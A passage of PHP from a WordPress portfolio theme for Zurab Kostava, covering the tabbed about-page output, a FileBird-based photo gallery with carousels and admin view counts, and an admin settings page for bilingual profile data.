                                <h4 class="zk-fav-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20.24 12.24a6 6 0 0 0-8.49-8.49L5 10.5V19h8.5z"></path><line x1="16" y1="8" x2="2" y2="22"></line><line x1="17.5" y1="15" x2="9" y2="15"></line></svg> <?php echo $is_ka ? 'მწერლები' : 'Writers'; ?></h4>
                                <ol><?php zk_render_fav_list('zk_fav_writers'); ?></ol>
                            </div>
                            <div class="zk-fav-col">
                                <h4 class="zk-fav-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="23 7 16 12 23 17 23 7"></polygon><rect x="1" y="5" width="15" height="14" rx="2" ry="2"></rect></svg> <?php echo $is_ka ? 'რეჟისორები' : 'Directors'; ?></h4>
                                <ol><?php zk_render_fav_list('zk_fav_directors'); ?></ol>
                            </div>
                            <div class="zk-fav-col">
                                <h4 class="zk-fav-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg> <?php echo $is_ka ? 'მსახიობები' : 'Actors'; ?></h4>
                                <ol><?php zk_render_fav_list('zk_fav_actors'); ?></ol>
                            </div>
                            <div class="zk-fav-col">
                                <h4 class="zk-fav-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18V5l12-2v13"></path><circle cx="6" cy="18" r="3"></circle><circle cx="18" cy="16" r="3"></circle></svg> <?php echo $is_ka ? 'არტისტები' : 'Artists'; ?></h4>
                                <ol><?php zk_render_fav_list('zk_fav_artists'); ?></ol>
                            </div>
                            <div class="zk-fav-col">
                                <h4 class="zk-fav-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg> <?php echo $is_ka ? 'ჯგუფები' : 'Bands'; ?></h4>
                                <ol><?php zk_render_fav_list('zk_fav_bands'); ?></ol>
                            </div>
                            <div class="zk-fav-col">
                                <h4 class="zk-fav-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><circle cx="12" cy="12" r="3"></circle></svg> <?php echo $is_ka ? 'ალბომები' : 'Albums'; ?></h4>
                                <ol><?php zk_render_fav_list('zk_fav_albums'); ?></ol>
                            </div>
                            <div class="zk-fav-col">
                                <h4 class="zk-fav-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 18v-6a9 9 0 0 1 18 0v6"></path><path d="M21 19a2 2 0 0 1-2 2h-4a2 2 0 0 1-2-2v-2a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2z"></path><path d="M3 19a2 2 0 0 0 2 2h4a2 2 0 0 0 2-2v-2a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2z"></path></svg> <?php echo $is_ka ? 'სიმღერები' : 'Songs'; ?></h4>
                                <ol><?php zk_render_fav_list('zk_fav_songs'); ?></ol>
                            </div>
                            <div class="zk-fav-col">
                                <h4 class="zk-fav-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg> <?php echo $is_ka ? 'ტექ გიკები' : 'Tech Nerds'; ?></h4>
                                <ol><?php zk_render_fav_list('zk_fav_nerds'); ?></ol>
                            </div>
                            <div class="zk-fav-col">
                                <h4 class="zk-fav-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"></circle><ellipse cx="12" cy="12" rx="10" ry="4" transform="rotate(45 12 12)"></ellipse><ellipse cx="12" cy="12" rx="10" ry="4" transform="rotate(-45 12 12)"></ellipse></svg> <?php echo $is_ka ? 'მეცნიერები' : 'Scientists'; ?></h4>
                                <ol><?php zk_render_fav_list('zk_fav_scientists'); ?></ol>
                            </div>
                            <div class="zk-fav-col">
                                <h4 class="zk-fav-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="7"></circle><polyline points="8.21 13.89 7 23 12 20 17 23 15.79 13.88"></polyline></svg> <?php echo $is_ka ? 'ათლეტები' : 'Athletes'; ?></h4>
                                <ol><?php zk_render_fav_list('zk_fav_athletes'); ?></ol>
                            </div>
                            <div class="zk-fav-col">
                                <h4 class="zk-fav-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path><circle cx="12" cy="13" r="4"></circle></svg> <?php echo $is_ka ? 'მოდელები' : 'Models'; ?></h4>
                                <ol><?php zk_render_fav_list('zk_fav_models'); ?></ol>
                            </div>
                        </div>
                    </div>

                </div>
            </div>

            <!-- TAB 2: MONOLOGUE -->
            <div class="zk-tab-panel" id="tab-monologue">
                <!-- აქ განგებ ვიყენებთ page__content კლასს, რომ შენი დაწერილი ულამაზესი ტიპოგრაფია (style.css-დან) ავტომატურად მოერგოს -->
                <div class="page__content">
                    <?php
                    $monologue = '';
                    if ($is_ka) {
                        $monologue = get_option('zk_monologue_content_ka', '');
                    }
                    if (empty(trim($monologue))) {
                        $monologue = get_option('zk_monologue_content', "<h3>The Monologue</h3>\n<p>This is where you can dive deep into your story.</p>");
                    }

                    // apply_filters('the_content', ...) უზრუნველყოფს, რომ ვორდპრესმა სწორად აღიქვას შენი დაწერილი აბზაცები და ვიდეოების/ფოტოების ლინკები
                    $has_filter = has_filter('the_content', 'zk_translate_content_wrapper');
                    if ($has_filter !== false) {
                        remove_filter('the_content', 'zk_translate_content_wrapper', 1);
                    }
                    echo apply_filters('the_content', $monologue);
                    if ($has_filter !== false) {
                        add_filter('the_content', 'zk_translate_content_wrapper', 1);
                    }
                    ?>
                </div>
            </div>

            <!-- TAB 3: GALLERY -->
            <div class="zk-tab-panel" id="tab-gallery">
                <div class="zk-bento-header" style="margin-bottom: 30px;">
                    <div class="zk-header-title">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
                        <h2><?php echo $is_ka ? 'გალერეა' : 'Gallery'; ?></h2>
                    </div>
                    <p class="zk-bento-desc"><?php 
                        if ($is_ka) {
                            $desc_life_ka = get_option('zk_desc_life_ka', '');
                            echo esc_html(!empty($desc_life_ka) ? $desc_life_ka : get_option('zk_desc_life', "კადრს მიღმა. არავითარი რენდერები, არავითარი კოდი — უბრალოდ ობიექტივით აღბეჭდილი რეალური ცხოვრება."));
                        } else {
                            echo esc_html(get_option('zk_desc_life', "Behind the scenes. No renders, no code—just real life captured through a lens."));
                        }
                    ?></p>
                </div>
                <div class="zk-filebird-gallery-wrapper">
                    <?php echo zk_get_filebird_gallery( 5 ); ?>
                </div>
            </div>

        </div><!-- /.zk-tabs-content -->

        <div class="zk-lightbox" id="zkLightbox" aria-hidden="true" role="dialog" aria-modal="true" aria-label="Photo viewer">
            <div class="zk-lightbox-top-title" id="zkLightboxTopTitle"></div>
            <button class="zk-lightbox-close" type="button" aria-label="Close">✕</button>
            <button class="zk-lightbox-arrow zk-lightbox-prev" type="button" aria-label="Previous"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="15 18 9 12 15 6"></polyline></svg></button>
            <button class="zk-lightbox-arrow zk-lightbox-next" type="button" aria-label="Next"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="9 18 15 12 9 6"></polyline></svg></button>
            <img class="zk-lightbox-img" src="" alt="" decoding="async">
            <div class="zk-lightbox-exif" id="zkLightboxExif"></div>
            <div class="zk-lightbox-thumbs" id="zkLightboxThumbs"></div>
        </div>
    </div><!-- /.zk-about-wrapper -->

    <?php return ob_get_clean();
}
add_shortcode( 'zk_about', 'zk_about_page_shortcode' );


/* ============================================================
   FILEBIRD CUSTOM GALLERY FETCHER (CINEMATIC LIGHTBOX)
   Emits the same GRID markup as [zk_photography]; the shared
   initGallery() in app.js drives it identically. The #zkLightbox
   overlay is rendered separately by [zk_about], OUTSIDE the
   (transformed) tab panels — see the note at the return below.
   ============================================================ */
function zk_get_filebird_gallery( $folder_id ) {
    global $wpdb;

    // FileBird-ის ცხრილი
    $table_name = $wpdb->prefix . 'fbv_attachment_folder';

    if ( $wpdb->get_var( "SHOW TABLES LIKE '$table_name'" ) != $table_name ) {
        return '<p style="color:var(--text-dim);">FileBird database table not found.</p>';
    }

    // Fetch subfolders of this folder
    $subfolders = $wpdb->get_results(
            $wpdb->prepare( "SELECT id, name FROM {$wpdb->prefix}fbv WHERE parent = %d", intval( $folder_id ) )
    );
    
    $all_folder_ids = array( intval( $folder_id ) );
    $subfolder_ids = array();
    $subfolder_names = array();
    foreach ( $subfolders as $sf ) {
        $all_folder_ids[] = (int) $sf->id;
        $subfolder_ids[ (int) $sf->id ] = true;
        $subfolder_names[ (int) $sf->id ] = $sf->name;
    }

    $id_ph = implode( ', ', array_fill( 0, count( $all_folder_ids ), '%d' ) );
    $rows = $wpdb->get_results(
            $wpdb->prepare( "SELECT attachment_id, folder_id FROM $table_name WHERE folder_id IN ($id_ph) ORDER BY attachment_id DESC", $all_folder_ids )
    );

    if ( empty( $rows ) ) {
        return '<p style="color:var(--text-dim);">No photos found in this FileBird folder.</p>';
    }

    $attachment_ids = array();
    $carousel_map = array();
    $att_to_folder = array();

    foreach ( $rows as $row ) {
        $att = (int) $row->attachment_id;
        $fid = (int) $row->folder_id;
        
        $attachment_ids[] = $att;
        
        if ( ! isset( $att_to_folder[ $att ] ) ) {
            $att_to_folder[ $att ] = $fid;
        }
        
        if ( isset( $subfolder_ids[ $fid ] ) ) {
            $carousel_map[ $fid ][] = $att;
        }
    }

    // ── Masonry grid — identical structure to the photography gallery. ──
    $output  = '<div class="zk-gallery-wrapper">';
    if ( current_user_can('administrator') ) {
        $total_views = 0;
        foreach ( $attachment_ids as $att_id ) {
            $total_views += (int) get_post_meta( $att_id, 'zk_photo_views', true );
        }
        $output .= '<div class="zk-total-views-admin" style="text-align:center; padding: 15px 20px; color: #0ff; font-weight: 600; font-family: monospace; font-size: 15px; letter-spacing: 2px; background: rgba(0,255,255,0.05); border-radius: 8px; margin-bottom: 20px;">TOTAL GALLERY VIEWS: ' . $total_views . '</div>';
    }
    $output .= '<div class="zk-gallery-grid" id="zkAboutGallery">';

    $i = 0;
    $rendered_carousels = array();
    $rendered_attachments = array();

    foreach ( $attachment_ids as $id ) {
        if ( isset( $rendered_attachments[ $id ] ) ) continue;

        $fid = isset($att_to_folder[$id]) ? $att_to_folder[$id] : 0;
        $is_carousel = isset($subfolder_ids[$fid]);

        if ( $is_carousel ) {
            if ( isset( $rendered_carousels[ $fid ] ) ) continue;
            $rendered_carousels[ $fid ] = true;

            $full_img  = wp_get_attachment_image_url( $id, 'full' );
            $thumb_img = wp_get_attachment_image_url( $id, 'thumbnail' );
            if ( ! $full_img ) continue;

            $alt_text    = get_post_meta( $id, '_wp_attachment_image_alt', true );
            $title       = get_the_title( $id );
            $caption     = wp_get_attachment_caption( $id );
            $description = get_post( $id )->post_content;

            if ( empty( $alt_text ) ) $alt_text = $title;
            if ( empty( $alt_text ) ) $alt_text = 'Zurab Kostava Capture';

            $img_attributes = array(
                    'data-full'        => esc_url( $full_img ),
                    'data-thumb'       => esc_url( $thumb_img ? $thumb_img : $full_img ),
                    'data-exif'        => '',
                    'data-title'       => esc_attr( $title ),
                    'data-caption'     => esc_attr( $caption ),
                    'data-description' => esc_attr( $description ),
                    'data-id'          => esc_attr( $id ),
                    'class'            => 'zk-grid-photo',
                    'alt'              => esc_attr( $alt_text ),
                    'sizes'            => '(max-width: 600px) 100vw, (max-width: 900px) 50vw, (max-width: 1320px) 33vw, 440px'
            );
            $img_attributes = array_merge( $img_attributes, zk_gallery_lightbox_source_attributes( $id ) );
            
            if ( current_user_can('administrator') ) {
                $img_attributes['data-views'] = (int) get_post_meta( $id, 'zk_photo_views', true );
            }

            if ( $i < 6 ) {
                $img_attributes['loading']       = 'eager';
                $img_attributes['fetchpriority'] = 'high';
            } else {
                $img_attributes['loading']  = 'lazy';
                $img_attributes['decoding'] = 'async';
            }

            $img_html = wp_get_attachment_image( $id, 'medium_large', false, $img_attributes );
            $folder_title = isset($subfolder_names[$fid]) ? $subfolder_names[$fid] : '';
            
            $carousel_count = isset($carousel_map[$fid]) ? count($carousel_map[$fid]) : 1;

            $output .= '<div class="zk-gallery-item zk-is-carousel" data-carousel-title="' . esc_attr( $folder_title ) . '">';
            $output .= '<div class="zk-gallery-image-wrap">';
            $output .= $img_html;
            
            $output .= '<div class="zk-carousel-count"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg> ' . $carousel_count . '</div>';

            if ( $folder_title ) {
                $output .= '<div class="zk-carousel-title">' . esc_html( $folder_title ) . '</div>';
            }
            $output .= '<svg class="zk-carousel-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="14" height="14" rx="2" ry="2"></rect><path d="M7 21h12a2 2 0 0 0 2-2V7"></path></svg>';
            
            if ( current_user_can('administrator') ) {
                $views = (int) get_post_meta( $id, 'zk_photo_views', true );
                $output .= '<div class="zk-photo-admin-views" style="position:absolute;top:10px;left:10px;background:rgba(0,0,0,0.8);color:#0ff;padding:4px 8px;border-radius:4px;font-size:12px;z-index:10;pointer-events:none;display:flex;align-items:center;gap:4px;"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg> ' . $views . '</div>';
            }
            
            $output .= '</div></div>';

            $rendered_attachments[ $id ] = true;
            $i++;

            // Hidden items
            if ( isset( $carousel_map[ $fid ] ) ) {
                foreach ( $carousel_map[ $fid ] as $c_att ) {
                    if ( $c_att == $id ) continue;

                    $c_full_img  = wp_get_attachment_image_url( $c_att, 'full' );
                    if ( ! $c_full_img ) continue;
                    $c_thumb_img = wp_get_attachment_image_url( $c_att, 'thumbnail' );
                    $c_alt_text  = get_post_meta( $c_att, '_wp_attachment_image_alt', true );
                    $c_title     = get_the_title( $c_att );
                    $c_caption   = wp_get_attachment_caption( $c_att );
                    $c_description = get_post( $c_att )->post_content;

                    if ( empty( $c_alt_text ) ) $c_alt_text = $c_title;
                    if ( empty( $c_alt_text ) ) $c_alt_text = 'Zurab Kostava Capture';

                    $c_img_attributes = array(
                            'data-full'        => esc_url( $c_full_img ),
                            'data-thumb'       => esc_url( $c_thumb_img ? $c_thumb_img : $c_full_img ),
                            'data-exif'        => '',
                            'data-title'       => esc_attr( $c_title ),
                            'data-caption'     => esc_attr( $c_caption ),
                            'data-description' => esc_attr( $c_description ),
                            'data-id'          => esc_attr( $c_att ),
                            'class'            => 'zk-grid-photo',
                            'alt'              => esc_attr( $c_alt_text ),
                            'loading'          => 'lazy',
                            'decoding'         => 'async',
                            'sizes'            => '1vw'
                    );
                    $c_img_attributes = array_merge( $c_img_attributes, zk_gallery_lightbox_source_attributes( $c_att ) );
                    
                    if ( current_user_can('administrator') ) {
                        $c_img_attributes['data-views'] = (int) get_post_meta( $c_att, 'zk_photo_views', true );
                    }

                    $c_img_html = wp_get_attachment_image( $c_att, 'thumbnail', false, $c_img_attributes );

                    $output .= '<div class="zk-gallery-item zk-carousel-hidden" data-carousel-title="' . esc_attr( $folder_title ) . '">';
                    $output .= '<div class="zk-gallery-image-wrap">' . $c_img_html . '</div>';
                    $output .= '</div>';

                    $rendered_attachments[ $c_att ] = true;
                }
            }

        } else {
            $full_img  = wp_get_attachment_image_url( $id, 'full' );
            $thumb_img = wp_get_attachment_image_url( $id, 'thumbnail' ); // light strip image
            if ( ! $full_img ) {
                continue;
            }

            $alt_text    = get_post_meta( $id, '_wp_attachment_image_alt', true );
            $title       = get_the_title( $id );
            $caption     = wp_get_attachment_caption( $id );
            $description = get_post( $id )->post_content;

            if ( empty( $alt_text ) ) {
                $alt_text = $title;
            }
            if ( empty( $alt_text ) ) {
                $alt_text = 'Zurab Kostava Capture';
            }

            $img_attributes = array(
                    'data-full'        => esc_url( $full_img ),
                    'data-thumb'       => esc_url( $thumb_img ? $thumb_img : $full_img ),
                    'data-exif'        => '',
                    'data-title'       => esc_attr( $title ),
                    'data-caption'     => esc_attr( $caption ),
                    'data-description' => esc_attr( $description ),
                    'data-id'          => esc_attr( $id ),
                    'class'            => 'zk-grid-photo',
                    'alt'              => esc_attr( $alt_text ),
                    'sizes'            => '(max-width: 600px) 100vw, (max-width: 900px) 50vw, (max-width: 1320px) 33vw, 440px'
            );
            $img_attributes = array_merge( $img_attributes, zk_gallery_lightbox_source_attributes( $id ) );
            
            if ( current_user_can('administrator') ) {
                $img_attributes['data-views'] = (int) get_post_meta( $id, 'zk_photo_views', true );
            }

            if ( $i < 6 ) {
                $img_attributes['loading']       = 'eager';
                $img_attributes['fetchpriority'] = 'high';
            } else {
                $img_attributes['loading']  = 'lazy';
                $img_attributes['decoding'] = 'async';
            }

            $img_html = wp_get_attachment_image( $id, 'medium_large', false, $img_attributes );

            $output .= '<div class="zk-gallery-item">';
            $output .= '<div class="zk-gallery-image-wrap">' . $img_html;
            
            if ( current_user_can('administrator') ) {
                $views = (int) get_post_meta( $id, 'zk_photo_views', true );
                $output .= '<div class="zk-photo-admin-views" style="position:absolute;top:10px;left:10px;background:rgba(0,0,0,0.8);color:#0ff;padding:4px 8px;border-radius:4px;font-size:12px;z-index:10;pointer-events:none;display:flex;align-items:center;gap:4px;"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg> ' . $views . '</div>';
            }
            
            $output .= '</div></div>';
            
            $rendered_attachments[ $id ] = true;
            $i++;
        }
    }

    $output .= '</div></div>';

    // NOTE: the #zkLightbox overlay is emitted by zk_about_page_shortcode() OUTSIDE the
    // tab panels — .zk-tab-panel's slide transform would otherwise trap position:fixed,
    // framing the viewer inside the panel instead of filling the viewport.
    return $output;
}

/* Life & Captures now uses the theme's own cinematic lightbox (see
   zk_get_filebird_gallery + initGallery in app.js) — PhotoSwipe removed. */



/* ============================================================
   IDENTITY SETTINGS PAGE (Backend UI)
   ============================================================ */
function zk_identity_menu() {
    add_menu_page('Identity Data', 'Identity', 'manage_options', 'zk-identity', 'zk_identity_page_html', 'dashicons-id', 20);
}
add_action('admin_menu', 'zk_identity_menu');

function zk_identity_page_html() {
    if (!current_user_can('manage_options')) return;

    if (isset($_POST['zk_identity_nonce']) && wp_verify_nonce($_POST['zk_identity_nonce'], 'zk_save_identity')) {
        foreach ($_POST as $key => $value) {
            if (strpos($key, 'zk_vital_') === 0 || strpos($key, 'zk_social_') === 0 || strpos($key, 'zk_fav_') === 0 || strpos($key, 'zk_desc_') === 0 || strpos($key, 'zk_schema_') === 0 || strpos($key, 'zk_site_') === 0 || $key === 'zk_skills' || $key === 'zk_skills_ka' || $key === 'zk_profile_img' || $key === 'zk_monologue_content' || $key === 'zk_monologue_content_ka') {
                update_option($key, wp_unslash($value));
            }
        }
        echo '<div class="notice notice-success"><p>Identity data saved successfully!</p></div>';
    }
    ?>
    <div class="wrap">
        <h1>Identity Settings</h1>
        <p>მართე შენი მონაცემები, სოციალური ქსელები და ბენტო ბოქსების აღწერები ორ ენაზე (ინგლისური და ქართული).</p>
        <form method="post" action="">
            <?php wp_nonce_field('zk_save_identity', 'zk_identity_nonce'); ?>

            <h2 class="title" style="margin-top:30px; border-bottom:1px solid #ccc; padding-bottom:10px;">1. Section Descriptions (Bento Boxes)</h2>
            <p style="color:#666;">თითოეული სექციის აღწერა ორ ენაზე. თუ ქართული ვერსია ცარიელია, საიტზე გამოჩნდება ინგლისური.</p>
            <table class="form-table">
                <tr>
                    <th style="vertical-align:top; padding-top:15px;">Vitals & Connect Desc</th>
                    <td>
                        <div style="margin-bottom:8px;"><strong style="font-size:12px; color:#2271b1;">[EN]:</strong> <input type="text" name="zk_desc_vitals" value="<?php echo esc_attr(get_option('zk_desc_vitals', "Zurab Kostava's digital ID, where he objectively looks much better than on his actual passport.")); ?>" class="large-text" /></div>
                        <div><strong style="font-size:12px; color:#135e96;">[KA]:</strong> <input type="text" name="zk_desc_vitals_ka" value="<?php echo esc_attr(get_option('zk_desc_vitals_ka', "ზურაბ კოსტავას ციფრული ID, სადაც ის ობიექტურად ბევრად უკეთ გამოიყურება, ვიდრე საკუთარ პასპორტში.")); ?>" class="large-text" /></div>
                    </td>
                </tr>
                <tr>
                    <th style="vertical-align:top; padding-top:15px;">Skills Desc</th>
                    <td>
                        <div style="margin-bottom:8px;"><strong style="font-size:12px; color:#2271b1;">[EN]:</strong> <input type="text" name="zk_desc_skills" value="<?php echo esc_attr(get_option('zk_desc_skills', "A brief list of capabilities. This isn't a flex for the portfolio—it's mostly here so he doesn't forget what he can actually do.")); ?>" class="large-text" /></div>
                        <div><strong style="font-size:12px; color:#135e96;">[KA]:</strong> <input type="text" name="zk_desc_skills_ka" value="<?php echo esc_attr(get_option('zk_desc_skills_ka', "შესაძლებლობების მოკლე სია. ეს არ არის პორტფოლიოსთვის თავის მოწონება — აქ ძირითადად იმიტომ წერია, რომ თავად არ დაავიწყდეს რისი გაკეთება შეუძლია.")); ?>" class="large-text" /></div>
                    </td>
                </tr>
                <tr>
                    <th style="vertical-align:top; padding-top:15px;">The Curated Mind Desc</th>
                    <td>
                        <div style="margin-bottom:8px;"><strong style="font-size:12px; color:#2271b1;">[EN]:</strong> <input type="text" name="zk_desc_favorites" value="<?php echo esc_attr(get_option('zk_desc_favorites', "Cultural influences. The definitive list that proves his exceptional taste in media (and yes, he is quite proud of it).")); ?>" class="large-text" /></div>
                        <div><strong style="font-size:12px; color:#135e96;">[KA]:</strong> <input type="text" name="zk_desc_favorites_ka" value="<?php echo esc_attr(get_option('zk_desc_favorites_ka', "კულტურული გავლენები. საბოლოო სია, რომელიც ამტკიცებს მის განსაკუთრებულ გემოვნებას მედიაში (და დიახ, ამით საკმაოდ ამაყობს).")); ?>" class="large-text" /></div>
                    </td>
                </tr>
                <tr>
                    <th style="vertical-align:top; padding-top:15px;">Life & Captures (Gallery) Desc</th>
                    <td>
                        <div style="margin-bottom:8px;"><strong style="font-size:12px; color:#2271b1;">[EN]:</strong> <input type="text" name="zk_desc_life" value="<?php echo esc_attr(get_option('zk_desc_life', "Behind the scenes. No renders, no code—just real life captured through a lens.")); ?>" class="large-text" /></div>
                        <div><strong style="font-size:12px; color:#135e96;">[KA]:</strong> <input type="text" name="zk_desc_life_ka" value="<?php echo esc_attr(get_option('zk_desc_life_ka', "კადრს მიღმა. არავითარი რენდერები, არავითარი კოდი — უბრალოდ ობიექტივით აღბეჭდილი რეალური ცხოვრება.")); ?>" class="large-text" /></div>
                    </td>
                </tr>
            </table>

            <h2 class="title" style="margin-top:30px; border-bottom:1px solid #ccc; padding-bottom:10px;">2. Vitals & Profile</h2>
            <table class="form-table">
                <tr><th>Profile Photo URL</th><td><input type="text" name="zk_profile_img" value="<?php echo esc_attr(get_option('zk_profile_img', 'https://via.placeholder.com/150x200')); ?>" class="regular-text" /></td></tr>
                <tr>
                    <th style="vertical-align:top; padding-top:15px;">Born</th>
                    <td>
                        <div style="margin-bottom:8px;"><strong style="font-size:12px; color:#2271b1;">[EN]:</strong> <input type="text" name="zk_vital_born" value="<?php echo esc_attr(get_option('zk_vital_born', '19.02.1995')); ?>" class="regular-text" /></div>
                        <div><strong style="font-size:12px; color:#135e96;">[KA]:</strong> <input type="text" name="zk_vital_born_ka" value="<?php echo esc_attr(get_option('zk_vital_born_ka', '19.02.1995')); ?>" class="regular-text" /></div>
                    </td>
                </tr>
                <tr>
                    <th style="vertical-align:top; padding-top:15px;">Origin</th>
                    <td>
                        <div style="margin-bottom:8px;"><strong style="font-size:12px; color:#2271b1;">[EN]:</strong> <input type="text" name="zk_vital_origin" value="<?php echo esc_attr(get_option('zk_vital_origin', 'Ozurgeti, Guria, Georgia')); ?>" class="regular-text" /></div>
                        <div><strong style="font-size:12px; color:#135e96;">[KA]:</strong> <input type="text" name="zk_vital_origin_ka" value="<?php echo esc_attr(get_option('zk_vital_origin_ka', 'ოზურგეთი, გურია, საქართველო')); ?>" class="regular-text" /></div>
                    </td>
                </tr>
                <tr>
                    <th style="vertical-align:top; padding-top:15px;">Base</th>
                    <td>
                        <div style="margin-bottom:8px;"><strong style="font-size:12px; color:#2271b1;">[EN]:</strong> <input type="text" name="zk_vital_base" value="<?php echo esc_attr(get_option('zk_vital_base', 'Tbilisi, Georgia')); ?>" class="regular-text" /></div>
                        <div><strong style="font-size:12px; color:#135e96;">[KA]:</strong> <input type="text" name="zk_vital_base_ka" value="<?php echo esc_attr(get_option('zk_vital_base_ka', 'თბილისი, საქართველო')); ?>" class="regular-text" /></div>
                    </td>
                </tr>
                <tr><th>Email (Primary)</th><td><input type="email" name="zk_vital_email_1" value="<?php echo esc_attr(get_option('zk_vital_email_1', 'zurab@kostavacreative.com')); ?>" class="regular-text" /></td></tr>
                <tr><th>Email (Secondary)</th><td><input type="email" name="zk_vital_email_2" value="<?php echo esc_attr(get_option('zk_vital_email_2', 'zurabkostava1@gmail.com')); ?>" class="regular-text" /></td></tr>
                <tr>
                    <th style="vertical-align:top; padding-top:15px;">Studio (HTML)</th>
                    <td>
                        <div style="margin-bottom:8px;"><strong style="font-size:12px; color:#2271b1;">[EN]:</strong> <input type="text" name="zk_vital_studio" value="<?php echo esc_attr(get_option('zk_vital_studio', 'Creative Lead @ <a href="https://zurabkostava.com" target="_blank">Kostava Creative</a>')); ?>" class="large-text" /></div>
                        <div><strong style="font-size:12px; color:#135e96;">[KA]:</strong> <input type="text" name="zk_vital_studio_ka" value="<?php echo esc_attr(get_option('zk_vital_studio_ka', 'კრეატიული ხელმძღვანელი @ <a href="https://zurabkostava.com/ka" target="_blank">Kostava Creative</a>')); ?>" class="large-text" /></div>
                    </td>
                </tr>
                <tr>
                    <th style="vertical-align:top; padding-top:15px;">Position (HTML)</th>
                    <td>
                        <div style="margin-bottom:8px;"><strong style="font-size:12px; color:#2271b1;">[EN]:</strong> <input type="text" name="zk_vital_position" value="<?php echo esc_attr(get_option('zk_vital_position', 'Web Designer @ <a href="https://emis.ge" target="_blank">EMIS Georgia</a>')); ?>" class="large-text" /></div>
                        <div><strong style="font-size:12px; color:#135e96;">[KA]:</strong> <input type="text" name="zk_vital_position_ka" value="<?php echo esc_attr(get_option('zk_vital_position_ka', 'ვებ დიზაინერი @ <a href="https://emis.ge" target="_blank">EMIS Georgia</a>')); ?>" class="large-text" /></div>
                    </td>
                </tr>
                <tr>
                    <th style="vertical-align:top; padding-top:15px;">Archetype</th>
                    <td>
                        <div style="margin-bottom:8px;"><strong style="font-size:12px; color:#2271b1;">[EN]:</strong> <input type="text" name="zk_vital_archetype" value="<?php echo esc_attr(get_option('zk_vital_archetype', 'Composer, Visual Artist, Tech Geek')); ?>" class="large-text" /></div>
                        <div><strong style="font-size:12px; color:#135e96;">[KA]:</strong> <input type="text" name="zk_vital_archetype_ka" value="<?php echo esc_attr(get_option('zk_vital_archetype_ka', 'კომპოზიტორი, ვიზუალური არტისტი, ტექ გიკი')); ?>" class="large-text" /></div>
                    </td>
                </tr>
            </table>

            <h2 class="title" style="margin-top:30px; border-bottom:1px solid #ccc; padding-bottom:10px;">3. ZK JSON-LD Schema & Bilingual SEO Identity</h2>
            <p><strong>Note:</strong> Multiple values should be comma-separated.</p>
            <table class="form-table">
                <tr><th>Full Name (EN)</th><td><input type="text" name="zk_schema_name" value="<?php echo esc_attr(get_option('zk_schema_name', 'Zurab Kostava')); ?>" class="regular-text" /></td></tr>
                <tr><th>Full Name (KA)</th><td><input type="text" name="zk_site_name_ka" value="<?php echo esc_attr(get_option('zk_site_name_ka', 'ზურაბ კოსტავა')); ?>" class="regular-text" /></td></tr>
